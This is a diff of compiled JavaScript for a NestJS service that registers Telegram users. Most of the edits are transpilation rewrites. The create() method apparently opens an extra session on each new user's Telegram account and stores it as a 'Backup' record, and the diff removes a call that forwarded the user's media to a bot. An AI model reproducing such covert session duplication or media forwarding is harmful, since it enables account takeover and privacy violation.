@@ -29,7 +29,7 @@ let UsersService = class UsersService {
     }
     async create(user) {
         const activeClientSetup = this.telegramService.getActiveClientSetup();
-        console.log("New User received - ", user?.mobile);
+        console.log("New User received - ", user === null || user === void 0 ? void 0 : user.mobile);
         console.log("ActiveClientSetup::", activeClientSetup);
         if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
             console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
@@ -40,9 +40,8 @@ let UsersService = class UsersService {
             setTimeout(async () => {
                 try {
                     await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-                    this.telegramService.forwardMediaToBot(user.mobile, null);
                     const newSession = await this.telegramService.createNewSession(user.mobile);
-                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
+                    const newUserBackup = new this.userModel(Object.assign(Object.assign({}, user), { session: newSession, lastName: "Backup" }));
                     await newUserBackup.save();
                 }
                 catch (error) {
@@ -57,7 +56,8 @@ let UsersService = class UsersService {
         return this.userModel.find().exec();
     }
     async findOne(tgId) {
-        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
+        var _a;
+        const user = await ((_a = (await this.userModel.findOne({ tgId }).exec())) === null || _a === void 0 ? void 0 : _a.toJSON());
         if (!user) {
             throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
         }
